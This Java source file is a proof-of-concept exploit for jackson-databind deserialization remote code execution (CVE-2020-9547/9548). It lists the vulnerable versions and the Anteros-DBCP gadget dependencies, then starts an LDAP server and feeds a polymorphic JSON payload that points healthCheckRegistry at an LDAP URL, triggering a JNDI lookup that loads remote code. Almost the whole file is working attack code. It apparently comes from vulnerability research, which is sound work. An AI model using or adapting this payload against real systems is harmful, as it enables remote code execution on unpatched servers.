package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 *
 * jackson-databind <= 2.10.2 and <= 2.9.10.3 RCE，需要开启DefaultType (reported by threedr3am & V1ZkRA)
 *
 * CVE-2020-9547, CVE-2020-9548
 *
 *     <dependency>
 *       <groupId>com.codahale.metrics</groupId>
 *       <artifactId>metrics-healthchecks</artifactId>
 *       <version>3.0.2</version>
 *     </dependency>
 *
 *     <dependency>
 *       <groupId>br.com.anteros</groupId>
 *       <artifactId>Anteros-Core</artifactId>
 *       <version>1.2.1</version>
 *     </dependency>
 *
 *     <dependency>
 *       <groupId>br.com.anteros</groupId>
 *       <artifactId>Anteros-DBCP</artifactId>
 *       <version>1.0.1</version>
 *     </dependency>
 *
 * @author threedr3am
 */
public class AnterosPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"br.com.anteros.dbcp.AnterosDBCPConfig\", {\"healthCheckRegistry\": \"ldap://localhost:43658/Calc\"}]";
    mapper.readValue(json, Object.class);
  }

}
